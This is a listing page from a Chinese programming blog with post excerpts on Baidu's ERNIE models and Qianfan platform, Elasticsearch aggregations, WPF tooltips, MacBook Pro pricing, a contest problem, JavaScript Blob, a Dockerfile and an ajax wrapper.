刚才讲解的是如何帮助企业快速去搭建应用。除了降低企业的应用开发门槛，企业还会有另外一个需求，就是我的应用效果怎么能够做好，这个背后是通过我们的各种基座模型的能力去实现的。
今天，在千帆大模型平台上的模型迎来了关键升级和全新模型发布，首先让我们来一起看下文心大模型3.5和4.0的重磅升级。
首先，为大家介绍文心大模型ERNIE 3.5的重磅升级！ERNIE 3.5在我们服务的云客户、AI开发者中均得到了高度认可。
升级后的ERNIE 3.5，在指令遵循、上下文学习和逻辑推理能力都有显著的效果提升，同时我们可以看到企业核心的文案创作、信息抽取、工具调用场景都有不同程度的效果优化。
那除了普遍应用的ERNIE 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6231c347e68bd53e86c0db2de02fcd29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80034f8f6ebecc79223d4269499ee374/" rel="bookmark">
			ES高可用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分布式搜索引擎ES 分布式搜索引擎ES1.数据聚合1.1.聚合的种类1.2.DSL实现聚合1.3.RestAPI实现聚合 2.自动补全2.1.拼音分词器2.2.自定义分词器2.3.自动补全查询2.4.实现酒店搜索框自动补全 3.数据同步思路分析 4.集群4.1 ES集群相关概念4.2.集群脑裂问题4.3.集群分布式存储4.4.集群分布式查询4.5.集群故障转移 分布式搜索引擎ES 1.数据聚合 聚合（aggregations）可以让我们极其方便的实现对数据的统计、分析、运算。例如：
什么品牌的手机最受欢迎？这些手机的平均价格、最高价格、最低价格？这些手机每月的销售情况如何？ 实现这些统计功能的比数据库的sql要方便的多，而且查询速度非常快，可以实现近实时搜索效果。
1.1.聚合的种类 聚合常见的有三类：
桶（Bucket）聚合：用来对文档做分组
TermAggregation：按照文档字段值分组，例如按照品牌值分组、按照国家分组Date Histogram：按照日期阶梯分组，例如一周为一组，或者一月为一组 度量（Metric）聚合：用以计算一些值，比如：最大值、最小值、平均值等
Avg：求平均值Max：求最大值Min：求最小值Stats：同时求max、min、avg、sum等 管道（pipeline）聚合：其它聚合的结果为基础做聚合
注意：参加聚合的字段必须是keyword、日期、数值、布尔类型
1.2.DSL实现聚合 现在，我们要统计所有数据中的酒店品牌有几种，其实就是按照品牌对数据分组。此时可以根据酒店品牌的名称做聚合，也就是Bucket聚合。
Bucket聚合语法
语法如下：
GET /hotel/_search { "size": 0, // 设置size为0，结果中不包含文档，只包含聚合结果 "aggs": { // 定义聚合 "brandAgg": { //给聚合起个名字 "terms": { // 聚合的类型，按照品牌值聚合，所以选择term "field": "brand", // 参与聚合的字段 "size": 20 // 希望获取的聚合结果数量 } } } } 结果如图：
聚合结果排序
默认情况下，Bucket聚合会统计Bucket内的文档数量，记为_count，并且按照_count降序排序。
我们可以指定order属性，自定义聚合的排序方式：
GET /hotel/_search { "size": 0, "aggs": { "brandAgg": { "terms": { "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80034f8f6ebecc79223d4269499ee374/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e4e3525fd438dba8d42c1840e6a54c5/" rel="bookmark">
			WPF —— ToolTip详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1 关于ToolTip组件的详解 将鼠标悬浮在上时，会获取相关的Tip信息。
2 关于ToolTip的实例 &lt;TextBox Width="300" Height="40" HorizontalAlignment="Left" VerticalAlignment="Top"&gt; 当鼠标移入输入框显示提示信息,把ToolTip当成一个属性来进行使用 &lt;TextBox.ToolTip&gt; s3赛季将要开启，德国和波兰开始派兵，一个面包六美元 &lt;/TextBox.ToolTip&gt; &lt;/TextBox&gt; &lt;Label Width="100" Height="40" Content="hello world"&gt; &lt;Label.ToolTip&gt; &lt;TextBlock&gt;实践活动商事登记&lt;/TextBlock&gt; &lt;/Label.ToolTip&gt; &lt;/Label&gt; 当有多个提示语 1 可以吧两句提示语添加一个父节点
&lt;Button Width="100" Height="40" Margin="200,0,0,0"&gt; 点击 &lt;Button.ToolTip&gt; &lt;!--可以吧两句提示语添加一个父节点--&gt; &lt;StackPanel&gt; &lt;TextBlock&gt;天王盖地虎&lt;/TextBlock&gt; &lt;TextBlock&gt;宝塔镇河妖&lt;/TextBlock&gt; &lt;/StackPanel&gt; &lt;/Button.ToolTip&gt; &lt;/Button&gt; 2 使用tooltip标签当成一个整体
&lt;Button Width="100" Height="40" Margin="200,0,0,0"&gt; 点击 &lt;Button.ToolTip&gt; 使用tooltip标签当成一个整体 &lt;ToolTip&gt; &lt;StackPanel&gt; &lt;TextBlock&gt;天王盖地虎&lt;/TextBlock&gt; &lt;TextBlock&gt;宝塔镇河妖&lt;/TextBlock&gt; &lt;/StackPanel&gt; &lt;/ToolTip&gt; &lt;/Button.ToolTip&gt; &lt;/Button&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/add0070f309cdfe3490a1a3f9517c584/" rel="bookmark">
			【家用机卖到服务器的笔电】苹果MacBook Pro搭载M3 Max芯片的型号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		苹果MacBook Pro搭载M3 Max芯片的型号之所以定价高昂，可以从以下几个方面来解释：
1. **先进技术与性能**：
- M3 Max是苹果自家设计的基于ARM架构的高性能处理器，采用了先进的5纳米或更先进制程工艺，提供了极为强大的CPU和GPU性能。相较于上一代产品，M3 Max在处理速度、图形性能以及能效比上都有显著提升，能够满足专业级用户对高强度工作流程的需求。
2. **定制化芯片**：
- 苹果自研芯片战略让其可以深度集成SoC（系统级芯片），如统一内存架构，将CPU、GPU和其他组件紧密结合，提供更高的数据传输效率和更低的功耗，这样的技术投入成本高，但带来了前所未有的性能表现。
3. **优质材料与制造工艺**：
- MacBook Pro系列采用高品质金属材质打造，一体成型工艺、精密加工的外壳、高分辨率的Retina显示屏以及触控栏等，体现了极高的工业设计水平和制造标准。
4. **内部组件与扩展性**：
- 高端型号支持大容量高速SSD存储（如8TB）、超大容量的统一内存（如128GB），这些硬件的成本本身就非常高昂。
5. **创新功能与用户体验**：
- macOS操作系统为用户提供独特的使用体验，并且持续更新以保持领先优势；同时MacBook Pro还可能包含诸如ProMotion高刷新率屏幕、高动态范围显示技术（如XDR）、更好的散热系统以及其他高级功能。
6. **品牌定位与市场策略**：
- 苹果一直定位在高端市场，其产品价格包含了品牌的溢价成分。苹果致力于打造一种高端、专业的品牌形象，并通过卓越的产品和服务吸引那些愿意为其出色设计、可靠性和服务支付额外费用的消费者。
7. **研发成本与利润考量**：
- 苹果公司在研发、设计、生产和营销上的巨额投入需要通过产品的销售得到回报，而且公司追求健康的利润率，这也是维持其业务发展和创新能力的重要保障。
综上所述，M3 Max版MacBook Pro的高价是由其尖端的技术、出色的性能、精良的制造工艺以及苹果的品牌价值共同决定的。尽管价格较高，但购买者通常会认为物有所值，因为它能够提供卓越的工作效率和长期稳定的使用体验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c745b8a2d9ad2573c84be13f6fabc155/" rel="bookmark">
			企业用大模型如何更具「效价比」？百度智能云发布5款大模型新品
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		服务8万企业用户，累计帮助用户精调1.3万个大模型，帮助用户开发出16万个大模型应用，自2023年12月以来百度智能云千帆大模型平台API日调用量环比增长97%...从一年前国内大模型平台的“开路先锋”到如今的大模型“超级工厂”，百度智能云千帆大模型平台在国内大模型市场牢牢占据着领先身位，但奔跑的脚步却并未停歇。
3月21日，百度智能云在北京首钢园召开千帆产品发布会，百度智能云在大会期间宣布：
1、携手北京市石景山区，共建全国首个百度智能云千帆大模型产业创新基地，助推区域产业腾飞；
2、满足企业“效价比”核心诉求，千帆ModelBuilder大模型服务全面升级，3个轻量级大模型、2个垂直场景大模型全新发布；
3、大幅降低AI原生应用开发门槛，千帆AppBuilder组件能力全面升级。
百度智能云千帆大模型产业（北京）创新基地启动建设
活动中，石景山区政府党组成员、副区长曹世辉，中关村石景山园管委会副主任崔明明，百度副总裁谢广军，百度副总裁石清华共同启动全国首个百度智能云干帆大模型产业（北京）创新基地。
创新基地致力于推动大模型技术与产业创新深度融合，双方将围绕提升算力供给、优化模型算法、推动数据开放、打造示范场景、深化人才引育等方面深耕厚植，政企合力打造人工智能产业新高地。曹世辉副区长表示，石景山区将与百度携手共进，聚焦人工智能和大模型技术研发和创新应用，构建完善AI 产业生态，为区域数字化转型和产业智能化升级提供支撑，为新质生产力的培育和发展注入澎湃动能。
百度副总裁谢广军
2023年，大模型在全球范围呈现出爆发式增长，国内更是打起了“百模大战”，无数科技大厂与科研院所聚焦大模型“本体”，疯狂“内卷”。
百度副总裁谢广军表示，大模型技术在过去一年飞速发展，随着逐步落地千行百业，2024年将成为国内大模型产业应用爆发的元年。针对企业最关心的大模型落地场景、使用成本、应用开发、应用效果四大挑战，百度智能云千帆在大模型、AI原生应用开发两个方面给出了最新“解题思路”。
百度智能云千帆大模型平台发布“3+2”新模型套餐：
提高企业应用大模型的“效价比”
大模型效果是“技术派”的不懈追求，而经济效益则是“市场派”的终极目标。谢广军在与诸多行业客户的交流中发现，除了极少的大客户对大模型有极致的效果追求，更多的企业和机构往往要综合考量大模型的使用效果、性能以及成本，即“效价比”。本次，千帆平台的模型矩阵针对企业的“效价比”核心诉求进行了一系列升级。
百度智能云千帆大模型平台模型矩阵
文心大模型ERNIE 3.5是目前百度智能云千帆大模型平台上最受欢迎的基础大模型之一。针对用户的常见通用的对话场景，ERNIE 3.5 在指令遵循、上下文学习和逻辑推理能力三方面分别进行了能力增强。升级后的ERNIE 3.5在企业应用场景如文案创作、信息抽取和工具调用三大场景中，应用表现分别大幅提升24%、27%和22%。
其次，相比超大规模参数的大模型，轻量级大模型的参数量更小，更便于客户针对特定使用场景进行模型精调，更容易达成使用效果预期，同时节约更多成本开销。本次大会，百度智能云发布了包括ERNIE Speed、ERNIE Lite、ERNIE Tiny在内，参数量由大到小的三款轻量级大模型，帮助客户实现“减量不减效”，节约不必要投资。
具体来讲，ERNIE Speed作为三款轻量级大模型中的“大个子”，推理场景下拥有最高128k的上下文长度，在处理知识问答等任务时，能够更好的处理上下文的依赖关系，生成更加连贯和准确的预测或回答。同时，针对特定场景可以将ERNIE Speed作为基座模型进行精调，模型效果可以追平甚至超过旗舰级大参数规模大模型，效价比大幅提升。
相比ERNIE Speed，ERNIE Lite的参数量则更小，也更加适合搭载在低算力的AI加速卡上处理推理任务，在兼顾模型效果与推理性能的同时，大幅降低客户落地应用成本。作为ERNIE-Bot-turbo模型的升级版，ERNIE Lite在情感分析、多任务学习、自然推理等场景下的应用效果提升了20%。推理调用成本大幅下降了53%！
三款轻量级模型中参数量最小的ERNIE Tiny则为客户提供了极致低成本、低延迟的最佳选择。在检索、推荐、意图识别等高并发、低延时等应用场景中，ERNIE Tiny的优异性能呈现了不俗表现。在某对话推荐业务场景中，精调后的ERNIE Tiny在搜索引擎推荐词激发环节，相比ERNIE 3.5，对话轮次增长了3.5%，成本下降了32%。
此外，企业在落地应用中，对大模型在人物扮演、外部工具调用均有更高的效果要求。本次千帆大模型平台ModelBuilder还基于对企业场景的深入洞察，结合百度自身业务最佳实践沉淀，推出了ERNIE Character和ERNIE Functions两款垂直场景大模型，分别适配客户在角色扮演类应用场景（如游戏NPC、客服对话等）和工具调用场景（对话中使用外部工具、调用业务函数等）中的使用需求。
在企业实践中，某智能硬件厂商，基于ERNIE Character打造智能助理，应用该模型后在人设一致性、激发并提升用户聊天欲望等方面效果显著提升。某旅游出行类APP，使用ERNIE Functions打造智能客服助手，在执行订票、查询航班状态等多种function调用上准确性达到85%。
千帆AppBuilder全面升级：
大幅降低AI原生应用开发门槛
千帆AppBuilder作为产业级AI原生应用开发平台，是千帆的重要组成部分。AppBuilder底层由基于百度多年技术和实践经验沉淀的大模型组件、AI能力组件的基础组件和面向典型应用场景深入调优建设的一系列高级组件构成。基础组件与高级组件共同支撑Agent，一方面可以通过工作流编排实现更为复杂的业务逻辑，另一方面Agent也具备强大的自主任务规划能力，能够理解用户意图自动规划执行路径，实现多工具的自动编排和执行。这些能力通过零代码态、代码态两类开发方式提供服务，更好的匹配不同开发者的使用需求。
开发完成后，应用可多渠道分发与集成，AppBuilder支持将应用一键分发到微信客服、微信公众号、Web端/H5及百度灵境矩阵等主流渠道。基于百度灵境矩阵，应用可在百度搜索、百度信息流等主流场景分发与挂载。真正实现应用开发出来后，就直接触达用户，打通从AI原生应用创建到开发再到分发的全流程。
百度智能云千帆AppBuilder
升级后的AppBuilder开放的工具组件多达55个。包括基于百度多年技术积累和自有业务沉淀的大模型组件、AI能力组件，也包括搜索等百度特色的业务组件、和多场景的第三方API工具，另外还提供了 RAG（知识检索问答）、GBI（生成式数据分析）等根据典型应用场景深入调优的高级能力组件。
开发AI原生应用离不开云基础设施，本次发布的基础组件还包括了百度智能云全新推出的向量数据库VDB 1.0。向量数据库是企业不可或缺的知识库核心组件，它针对传统知识库问答系统遇到的性能瓶颈、维护挑战及规模限制等问题提供了有力解决方案。全新发布的百度向量数据库VDB 1.0，不仅集成了全面的运维控制和安全防护能力，还兼容了千帆、LangChain等主流生态系统，能够帮助企业轻松管理数以千万计的文档知识，最大支持百亿向量存储规模以及毫秒级的向量检索速度。同时，相比同类型开源产品，VDB 1.0性能最高提升10倍。
在组件之上，千帆AppBuilder推出的Agent（智能体）应用框架，具备精准的任务自主规划能力，对多种应用工具的自动编排准确率超过90%，这个数字还在不断提升。AppBuilder还支持开发者接入自定义工具，通过将自动编排与手动编排相结合，实现更复杂场景应用的需求定制。Agent框架内的代码解释器能力，也在本次升级中大幅提升了40%的性能、在复杂的数据分析场景的生成结果可接受度高达95%，轻松应对各类数据分析与信息处理的场景。
此外，AppBuilder的代码态开发工具也再添利器。AppBuilder SDK本次重磅发布了Agent API，支持开发者将Agent便捷集成到自己的业务系统中，同时AppBuilder SDK面向主流AI原生应用场景提供了丰富的应用样例，目前已在Github开源，支持各个组件自由调用的灵活编排，帮助开发者实现应用的二次开发和便捷集成。
大会现场，还演示了如何在零代码开发模式中，只用1分钟构建一个“英语作文小帮手”Agent（智能体）应用，只需在AppBuilder中输入应用名称或希望开发的应用功能，平台就可以自动生成应用，通过简单的调整角色指令、添加所需工具组件，就可以快速生成一个英语作文批改小助手。发布后就可直接使用，三步完成应用创建与分发。
1分钟创建英语作文批改小助手
在百度智能云看来，随着大模型技术的不断演进和突破，工程化实践与用户需求适配正在变得愈发重要。只有深入场景，发掘、响应客户的真实需求，才是释放创新技术红利的最佳路径。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f47d127d2f6a791b1d932980a47a713/" rel="bookmark">
			P8665 [蓝桥杯 2018 省 A] 航班时间-洛谷
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​​​​​​例题：
P8665 [蓝桥杯 2018 省 A] 航班时间-洛谷
前置知识 去程时间 =飞行时间 + 时差；回程时间 = 飞行时间 − 时差由此可知 飞行时间 = （去+回）/ 2 用 scanf 输入前面的时间： scanf("%d:%d:%d %d:%d:%d",&amp;h1,&amp;m1,&amp;s1,&amp;h2,&amp;m2,&amp;s2); 每一行后面不一定有额外的天数。如果有，则中间一定有空格，所以判断下一个字符是否为空格即可。为方便计算，不妨把时间都转换成以秒为单位 t=86400⋅d+3600⋅h+60⋅m+sh = ans/3600 min = ans%3600/60 s = ans%60 注意 不能define int longlong 超数据了
#include &lt;bits/stdc++.h&gt; #define endl '\n' #define INF 0x3f3f3f3f3f const int N = 1000010; using namespace std; int get() { int h1,m1,s1,h2,m2,s2,day=0; scanf("%d:%d:%d %d:%d:%d",&amp;h1,&amp;m1,&amp;s1,&amp;h2,&amp;m2,&amp;s2); if(getchar()==' ')scanf("(+%d)",&amp;day); return (day*86400+h2*3600+m2*60+s2)-(h1*3600+m1*60+s1); } signed main() { int T; scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f47d127d2f6a791b1d932980a47a713/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12283759b806f99de5b406f9f3543601/" rel="bookmark">
			【JavaScript 漫游】【040】Blob 对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章简介
本篇文章为【JavaScript 漫游】专栏的第 040 篇文章，对浏览器模型中的 Blob 对象进行了总结。
概述 Blob 对象表示一个二进制文件的数据内容，比如一个图片文件的内容就可以通过 Blob 对象读写。它通常用来读写文件，它的名字是 Binary Large Object（二进制大型对象）的缩写。
浏览器原生提供 Blob() 构造函数，用来生成实例对象。
new Blob(array, [, options]); Blob 构造函数接受两个参数。第一个参数是数组，成员是字符串或二进制对象，表示新生成的 Blob 实例对象的内容；第二个参数是可选的，是一个配置对象，目前只有一个属性 type，它的值是一个字符串，表示类型的 MIME 类型，默认是空字符串。
var htmlFragment = ['&lt;a id="a"&gt;&lt;b id="b"&gt;hey!&lt;/b&gt;&lt;/a&gt;']; var myBlob = new Blob(htmlFragment, {type : 'text/html'}); var obj = { hello: 'world' }; var blob = new Blob([ JSON.stringify(obj) ], {type : 'application/json'}); 实例属性和实例方法 Blob 具有两个实例属性 size 和 type，分别返回数据的大小和类型。
var htmlFragment = ['&lt;a id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/12283759b806f99de5b406f9f3543601/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/235b7790d037b4f4b7654ad993f1a2cd/" rel="bookmark">
			docker构建镜像命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		编写dockerfile文件 例子1;
FROM oraclelinux:7-slim ENV release=19 ENV update=13 RUN curl -o /etc/yum.repos.d/public-yum-ol7.repo https://yum.oracle.com/public-yum-ol7.repo &amp;&amp; \ yum-config-manager --enable ol7_oracle_instantclient &amp;&amp; \ yum install -y java-1.8.0-openjdk-devel.x86_64 &amp;&amp; \ yum -y install oracle-instantclient${release}.${update}-basic oracle-instantclient${release}.${update}-devel oracle-instantclient${release}.${update}-sqlplus &amp;&amp; \ rm -rf /var/cache/yum &amp;&amp; \ echo /usr/lib/oracle/${release}.${update}/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient${release}.${update}.conf &amp;&amp; \ ldconfig #install sqlhc RUN mkdir -p /root/shell COPY sqlhc.sh /root/shell/ COPY sqlhc.sql /root/shell/ RUN chmod +x /root/shell/sqlhc.sh #PDF RUN mkdir -p /root/pdf COPY asmChart.jasper /root/pdf/ COPY asmInfo.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/235b7790d037b4f4b7654ad993f1a2cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eff79fca540b6a696d456d536e075f7b/" rel="bookmark">
			原生ajax进行简单的封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/* xhr + promise 封装一个异步ajax请求的通用函数 简洁版 ajax ('xxx.json') */ function ajax(url) { return new Promise((resolve, reject) =&gt; { // 创建一个XHR对象 const xhr = new XMLHttpRequest() // 初始化一个异步请求(还没发请求) xhr.open('GET', url, true) // 绑定状态改变的监听 xhr.onreadystatechange = function () { /* ajax引擎得到响应数据后 将xhr的readyState属性指定为4 将响应数据保存在response / responseText属性上 调用此回调函数 */ // 如果状态值不为4, 直接结束(请求还没有结束) if (xhr.readyState !== 4) { return } // 如果响应码在200~~299之间, 说明请求都是成功的 if (xhr.status&gt;=200 &amp;&amp; xhr.status&lt;300) { // 指定promise成功及结果值 resolve(JSON.parse(xhr.responseText)) } else { // 请求失败了 // 指定promise失败及结果值 reject(new Error('request error staus '+ request.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eff79fca540b6a696d456d536e075f7b/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/14/">«</a>
	<span class="pagination__item pagination__item--current">15/134</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/16/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 老帅的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>